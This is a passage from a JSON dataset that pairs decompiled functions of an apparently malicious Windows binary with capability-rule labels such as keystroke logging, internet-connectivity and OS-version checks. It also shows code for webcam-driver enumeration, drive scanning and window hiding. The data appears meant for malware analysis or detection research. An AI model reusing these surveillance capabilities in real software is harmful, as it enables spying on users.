        "decompiled_code": "\nvoid __cdecl fcn.0045c67c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.00459a30();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045bee0();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.00459a30();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045bee0();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "0045c8c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045c8c4(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x492aec == 2) && (3 < **0x492734)) ||\n       ((**0x492aec == 1 && ((4 < **0x492734 || ((**0x492734 == 4 && (9 < **0x492998)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.0045cab4();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 277
    },
    "0045c9f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c9f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x492750)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 72
    },
    "0045ca14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ca14(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x492750)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00461d88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint64_t fcn.00461d88(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0x461dc8;\n    uStack16 = 0x461dd8;\n    uStack20 = 0x461d99;\n    uStack20 = sub.kernel32.dll_GetModuleHandleA_2();\n    pcVar1 = sub.kernel32.dll_GetProcAddress_1();\n    if (pcVar1 != NULL) {\n        iVar2 = sub.kernel32.dll_GetCurrentProcess(&stack0xffffffec);\n        iVar3 = (*pcVar1)();\n        if (iVar3 == 0) {\n            sub.kernel32.dll_Sleep_1(100);\n        }\n        return CONCAT44(iVar2, iVar2 != 0);\n    }\n    return uStack20 << 0x20;\n}\n",
        "token_count": 210
    },
    "004636c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004636c8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack332;\n    uint uStack328;\n    uchar *puStack324;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    puStack324 = 0x4636ec;\n    fcn.004058ec();\n    uStack328 = 0x4637af;\n    uStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack324 = &stack0xfffffffc;\n    iVar1 = fcn.004614a0();\n    if ((iVar1 != -1) && (iVar1 = fcn.004614c0(),  iVar1 != 0)) {\n        while (iVar1 = fcn.004614e0(),  iVar1 != 0) {\n            fcn.004056dc();\n            fcn.004097dc();\n            fcn.00405a48();\n        }\n    }\n    *in_FS_OFFSET = uStack332;\n    puStack324 = 0x4637b6;\n    uStack328 = 0x4637a6;\n    fcn.00405490();\n    uStack328 = 0x4637ae;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 316
    },
    "00464014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464014(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4640d0;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    cVar3 = 'A';\n    do {\n        fcn.00405654();\n        fcn.00405738();\n        uVar1 = fcn.004058fc();\n        iVar2 = sub.kernel32.dll_GetDriveTypeA(uVar1);\n        if (1 < iVar2) {\n            fcn.00405654(0);\n            fcn.004056d0(0x4640f4, 0x4640e8, 0);\n            fcn.00405800(0x464100, 0);\n        }\n        cVar3 = cVar3 + '\\x01';\n    } while (cVar3 != '[');\n    fcn.004054c0();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4640d7;\n    uStack40 = 0x4640cf;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 328
    },
    "00464134": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00464134(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004058fc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 63
    },
    "00464150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00464150(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar1 = fcn.004058fc(uVar1);\n    iVar2 = sub.kernel32.dll_MoveFileA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 76
    },
    "004645e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004645e8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uStack608;\n    uint uStack604;\n    uchar *puStack600;\n    uint var_244h;\n    uint var_240h;\n    uint uStack576;\n    uint uStack568;\n    uint uStack564;\n    uint uStack556;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack600 = &stack0xfffffffc;\n    uStack604 = 0x464762;\n    uStack608 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffda0;\n    fcn.0040546c();\n    uVar1 = fcn.004614a0();\n    iVar2 = fcn.00461500();\n    while (iVar2 != 0) {\n        uVar8 = 0;\n        uVar7 = uStack576;\n        fcn.00409e24(uStack576);\n        uVar6 = 0;\n        uVar4 = uStack568;\n        fcn.00409dd4(uStack568);\n        uVar5 = 0;\n        uVar3 = uStack564;\n        fcn.00409dd4(uStack564);\n        fcn.00409dfc(uVar3, uVar5, uVar4, uVar6, uVar7, uVar8);\n        uVar4 = 0;\n        uVar3 = uStack556;\n        fcn.00409e24(uStack556);\n        fcn.004056dc(0, uVar3, uVar4);\n        uStack608 = 0x464790;\n        fcn.00405800();\n        iVar2 = fcn.00461520();\n    }\n    sub.kernel32.dll_CloseHandle_1();\n    fcn.004054c0();\n    *in_FS_OFFSET = uVar1;\n    uStack604 = 0x464769;\n    uStack608 = 0x464754;\n    fcn.0040546c();\n    uStack608 = 0x464761;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 543
    },
    "0046581c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.0046581c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_150h;\n    uchar *var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    iVar2 = 0x29;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_10h = NULL;\n    puStack36 = 0x465844;\n    var_1ch = unaff_EDI;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack36 = 0x46584c;\n    fcn.004058ec();\n    uStack40 = 0x465b86;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x465862;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040546c();\n    puStack48 = 0x46586e;\n    var_14h = fcn.00420f38();\n    puStack48 = 0x46587d;\n    var_18h = fcn.00404610();\n    puStack48 = 0x465888;\n    fcn.00409e54();\n    puStack48 = 0x46588d;\n    fcn.00465714();\n    uStack52 = 0x465b4a;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x465b39;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421714();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            var_1ch = iVar2;\n            (**(*var_18h + 0xc))();\n            cVar1 = fcn.00421854();\n            if (cVar1 == '\\x01') {\n                fcn.00405504();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x465bac, var_ch, 0x465bac, var_124h);\n                uStack64 = 0x465960;\n                fcn.004218dc();\n                uStack64 = var_128h;\n                uStack68 = 0x465bb8;\n                fcn.00405800();\n            }\n            else if (cVar1 == '\\x03') {\n                fcn.00405504();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x465bac, var_ch, 0x465bac, var_130h);\n                uStack64 = 0x4659d5;\n                fcn.00421968();\n                uStack64 = 0x4659e0;\n                fcn.00409ce8();\n                uStack64 = var_134h;\n                uStack68 = 0x465bb8;\n                fcn.00405800();\n            }\n            else if (cVar1 == '\\x02') {\n                fcn.00405504();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x465bac, var_ch, 0x465bac, var_13ch);\n                uStack64 = 0x465a58;\n                fcn.004218dc();\n                uStack64 = var_140h;\n                uStack68 = 0x465bb8;\n                fcn.00405800();\n            }\n            if (cVar1 == '\\x04') {\n                arg_8h = 0x100;\n                (**(*var_18h + 0xc))();\n                iVar2 = fcn.00421998(arg_8h);\n                if (0 < iVar2) {\n                    fcn.00405504();\n                }\n                (**(*var_18h + 0xc))(*var_10h);\n                puStack48 = var_14ch;\n                uStack52 = 0x465bac;\n                uStack56 = var_ch;\n                puStack60 = 0x465bac;\n                uStack64 = 0x465af1;\n                fcn.004056dc();\n                uStack64 = var_150h;\n                uStack68 = 0x465bb8;\n                fcn.00405800();\n            }\n            var_1ch = var_1ch + -1;\n            iVar2 = var_1ch;\n        } while (var_1ch != 0);\n    }\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x465b40;\n    uStack64 = 0x465b28;\n    fcn.00420fe4();\n    uStack64 = 0x465b30;\n    fcn.00404640();\n    uStack64 = 0x465b38;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 1446
    },
    "00466e38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00466e38(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.00466e38::var_1h + 1;\n    puStack44 = &fcn.00466e38::var_1h + 1;\n    uStack36 = 0x466ec2;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x466e9b;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    fcn.0045def4(&fcn.00466e38::var_8h);\n    (**(_pe_dos_header + 0x78))();\n    fcn.00407208();\n    var_1h._0_1_ = var_8h != 1;\n    *in_FS_OFFSET = 0;\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x466ec9;\n    puStack44 = 0x466ec1;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 335
    },
    "00467f9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00467f9c(void)\n\n{\n    char in_AL;\n    \n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    if (in_AL == '\\x01') {\n        fcn.0042187c();\n    }\n    else if (in_AL == '\\0') {\n        fcn.004215c4();\n    }\n    fcn.00420fe4();\n    return;\n}\n",
        "token_count": 141
    },
    "004680d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004680d8(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    \n    if (in_AL == '\\x01') {\n        uVar1 = sub.user32.dll_FindWindowA(0x468130, 0, 0, 0x468128, 0, 0xffffffff);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n        return;\n    }\n    if (in_AL == '\\0') {\n        uVar1 = sub.user32.dll_FindWindowA(0x468130, 0, 0, 0x468128, 0, 0);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "004681b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004681b8(void)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iStack160;\n    uint uStack156;\n    uchar *puStack152;\n    uint var_88h;\n    uint lpClassName;\n    uint var_4h;\n    \n    puStack152 = &stack0xfffffffc;\n    uStack156 = 0x468282;\n    iStack160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack160;\n    iVar1 = sub.user32.dll_FindWindowA(0x468290, 0);\n    iVar2 = sub.user32.dll_GetWindow(iVar1, 5);\n    while (iVar4 = iVar2,  iVar4 != 0) {\n        iVar1 = iVar4;\n        iVar2 = sub.user32.dll_GetClassNameA();\n        uVar3 = iVar2 == 0;\n        if (0 < iVar2) {\n            fcn.0040aa8c();\n            fcn.00409754();\n            fcn.00405894();\n            if (uVar3) {\n                if (in_AL == '\\x01') {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n            }\n        }\n        iVar2 = sub.user32.dll_GetWindow(iVar4, 2, iVar1);\n        iVar1 = iVar4;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.0040546c(0x468289);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 381
    },
    "00468410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468410(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack560;\n    uint uStack556;\n    uchar *puStack552;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ah;\n    uint var_105h;\n    \n    puStack552 = &stack0xfffffffc;\n    uStack556 = 0x4684d7;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    iVar2 = 0;\n    while (iVar1 = sub.AVICAP32.DLL_capGetDriverDescriptionA\n                             (iVar2, &fcn.00468410::var_105h, 0x105, &fcn.00468410::var_20ah, 0x105),  iVar1 != 0) {\n        fcn.004056dc(*in_EAX);\n        fcn.004056dc(0x4684f0, 0);\n        fcn.00405800(0x4684fc, 0);\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack560;\n    puStack552 = 0x4684de;\n    uStack556 = 0x4684d6;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 314
    },
    "00469e1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00469e1c(uint32_t param_1, uint8_t *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar18 = in_EAX >> 0x10;\n    uVar2 = in_EAX & 0xffff;\n    if (param_1 == 1) {\n        uVar2 = uVar2 + *param_2;\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar18 = uVar18 + uVar2;\n        if (0xfff0 < uVar18) {\n            uVar18 = uVar18 - 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    else if (param_2 == NULL) {\n        uVar2 = 1;\n    }\n    else if (param_1 < 0x10) {\n        while (param_1 != 0) {\n            uVar2 = uVar2 + *param_2;\n            param_2 = param_2 + 1;\n            uVar18 = uVar18 + uVar2;\n            param_1 = param_1 - 1;\n        }\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar2 = uVar18 % 0xfff1 << 0x10 | uVar2;\n    }\n    else {\n        if (0x15af < param_1) {\n            do {\n                param_1 = param_1 - 0x15b0;\n                iVar1 = 0x15b;\n                do {\n                    iVar3 = uVar2 + *param_2;\n                    iVar4 = iVar3 + param_2[1];\n                    iVar5 = iVar4 + param_2[2];\n                    iVar6 = iVar5 + param_2[3];\n                    iVar7 = iVar6 + param_2[4];\n                    iVar8 = iVar7 + param_2[5];\n                    iVar9 = iVar8 + param_2[6];\n                    iVar10 = iVar9 + param_2[7];\n                    iVar11 = iVar10 + param_2[8];\n                    iVar12 = iVar11 + param_2[9];\n                    iVar13 = iVar12 + param_2[10];\n                    iVar14 = iVar13 + param_2[0xb];\n                    iVar15 = iVar14 + param_2[0xc];\n                    iVar16 = iVar15 + param_2[0xd];\n                    iVar17 = iVar16 + param_2[0xe];\n                    uVar2 = iVar17 + param_2[0xf];\n                    uVar18 = uVar18 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    param_2 = param_2 + 0x10;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n                uVar2 = uVar2 % 0xfff1;\n                uVar18 = uVar18 % 0xfff1;\n            } while (0x15af < param_1);\n        }\n        if (param_1 != 0) {\n            for (; 0xf < param_1; param_1 = param_1 - 0x10) {\n                iVar1 = uVar2 + *param_2;\n                iVar3 = iVar1 + param_2[1];\n                iVar4 = iVar3 + param_2[2];\n                iVar5 = iVar4 + param_2[3];\n                iVar6 = iVar5 + param_2[4];\n                iVar7 = iVar6 + param_2[5];\n                iVar8 = iVar7 + param_2[6];\n                iVar9 = iVar8 + param_2[7];\n                iVar10 = iVar9 + param_2[8];\n                iVar11 = iVar10 + param_2[9];\n                iVar12 = iVar11 + param_2[10];\n                iVar13 = iVar12 + param_2[0xb];\n                iVar14 = iVar13 + param_2[0xc];\n                iVar15 = iVar14 + param_2[0xd];\n                iVar16 = iVar15 + param_2[0xe];\n                uVar2 = iVar16 + param_2[0xf];\n                uVar18 = uVar18 + iVar1 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +\n                         iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + uVar2;\n                param_2 = param_2 + 0x10;\n            }\n            while (param_1 != 0) {\n                uVar2 = uVar2 + *param_2;\n                param_2 = param_2 + 1;\n                uVar18 = uVar18 + uVar2;\n                param_1 = param_1 - 1;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            uVar18 = uVar18 % 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1304
    },
    "0046abf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046abf0(uint32_t param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    arg_10h = in_EAX[1];\n    if (param_1 < in_EAX[1]) {\n        arg_10h = param_1;\n    }\n    if (arg_10h == 0) {\n        arg_10h = 0;\n    }\n    else {\n        in_EAX[1] = in_EAX[1] - arg_10h;\n        if (*(in_EAX[7] + 0x18) == 1) {\n            iVar1 = fcn.00469e1c();\n            in_EAX[0xc] = iVar1;\n        }\n        fcn.00469cb4(param_2, *in_EAX, arg_10h);\n        *in_EAX = *in_EAX + arg_10h;\n        in_EAX[2] = in_EAX[2] + arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 252
    },
    "0046d6c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046d6e7)\n\nint32_t __cdecl fcn.0046d6c0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.0046a124(0x38);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0046a6e0();\n        if (iVar1 == 1) {\n            *in_EDX = var_28h;\n            iVar1 = fcn.0046a9a4();\n        }\n        else {\n            fcn.0046a9a4();\n            if (iVar1 == 0) {\n                iVar1 = -5;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 242
    },
    "0046f3dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046f3dc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack300;\n    \n    fcn.004614a0();\n    iVar1 = fcn.004614c0();\n    if (iVar1 != 0) {\n        while (iVar1 = fcn.004614e0(),  iVar1 != 0) {\n            if (in_EAX == iStack300) {\n                fcn.004056dc();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00471654": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
